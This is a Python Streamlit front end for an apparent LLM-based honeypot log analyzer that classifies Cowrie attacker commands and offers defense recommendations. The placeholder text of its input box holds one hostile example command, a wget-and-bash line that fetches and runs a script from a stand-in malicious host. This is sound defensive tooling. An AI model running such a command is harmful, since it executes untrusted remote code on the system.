import streamlit as st
import requests
import json
import time

API_URL = "http://localhost:8000"   # FastAPI base URL


st.set_page_config(
    page_title="LLM Honeypot Log Analyzer",
    page_icon="🛡️",
    layout="wide"
)

st.title("🛡️ LLM Honeypot Log Analyzer")
st.caption("Classify attacker commands & get defense recommendations in real-time.")


# -------------------------
# SECTION 1 — Manual Log Test
# -------------------------
st.header("🔍 Test a Single Log Entry")

log_input = st.text_area(
    "Enter attacker command / honeypot log",
    placeholder="Example: wget http://malicious.com/x.sh && bash x.sh",
    height=140
)

if st.button("Classify Log", use_container_width=True):
    if not log_input.strip():
        st.error("Please enter a log entry.")
    else:
        with st.spinner("Analyzing…"):
            res = requests.post(f"{API_URL}/classify", json={"log": log_input})
            data = res.json()

        st.subheader("📌 Classification Result")
        st.write(f"**Attack Type:** `{data['attack_type']}`")
        st.write(f"**Severity:** ⭐ {data['severity']}/10")
        st.write("**Summary:**")
        st.info(data["summary"])
        st.write("**Recommendations:**")
        st.success("\n".join([f"- {r}" for r in data["recommendations"]]))


# -----------------------------------
# SECTION 2 — Upload Cowrie JSON logs
# -----------------------------------
st.header("📁 Upload Cowrie Logs (JSON Lines)")

cowrie_file = st.file_uploader("Choose a .json or .jsonl file", type=["json", "jsonl"])

if cowrie_file:
    st.success("File received! Click Analyze to process.")

    if st.button("Analyze File", use_container_width=True):
        logs = []
        for line in cowrie_file.readlines():
            try:
                logs.append(json.loads(line))
            except:
                pass

        st.write(f"Loaded {len(logs)} Cowrie events")

        # Send each entry for classification
        results = []
        progress = st.progress(0)

        for i, entry in enumerate(logs):
            # Cowrie commands are usually at: entry["input"]
            cmd = entry.get("input", "")

            if not cmd:
                continue

            res = requests.post(f"{API_URL}/ingest/cowrie", json=entry)
            results.append(res.json())

            progress.progress((i + 1) / len(logs))

        st.success("Analysis complete!")

        # for r in results:
        #     with st.expander(f"Log ID: {r['id']} — {r['attack_type']}"):
        #         st.write("### Summary")
        #         st.info(r["summary"])
        #         st.write("### Severity")
        #         st.write(f"⭐ {r['severity']}/10")
        #         st.write("### Recommendations")
        #         st.success("\n".join([f"- {x}" for x in r["recommendations"]]))
        for r in results:
            cmd = r.get("extracted_command") or r.get("label") or "<no command>"
            label = r.get("label", "<unknown>")
            
            #with st.expander(f"Command: {cmd} — {label}"):
            with st.expander(f"[{r.get('eventid')}] {r.get('extracted_command')} — {r.get('attack_type')}"):

                st.write("### Summary")
                st.info(r.get("summary", ""))
                st.write("### Severity")
                st.write(f"⭐ {r.get('severity', 0)}/10")
                
                st.write("### Recommendations")
                recs = r.get("recommendations") or []
                if recs:
                    st.success("\n".join([f"- {x}" for x in recs]))
                else:
                    st.write("No recommendations.")


# -------------------------------------------------
# SECTION 3 — Streaming Test (Live Ingestion View)
# -------------------------------------------------
st.header("📡 Live Stream (real-time classification)")

if st.button("Start Stream", use_container_width=True):
    st.info("Listening to /stream endpoint…")

    placeholder = st.empty()

    for _ in range(30):  # stream 30 messages max
        res = requests.get(f"{API_URL}/stream")
        if res.status_code != 200:
            placeholder.error("Stream endpoint not responding.")
            break

        data = res.json()

        with placeholder.container():
            st.subheader("🔥 Incoming Log")
            st.code(data["log"])
            st.write(f"**Type:** {data['attack_type']}")
            st.write(f"**Severity:** ⭐ {data['severity']}/10")
            st.info(data["summary"])
            st.success("\n".join([f"- {r}" for r in data["recommendations"]]))

        time.sleep(1)
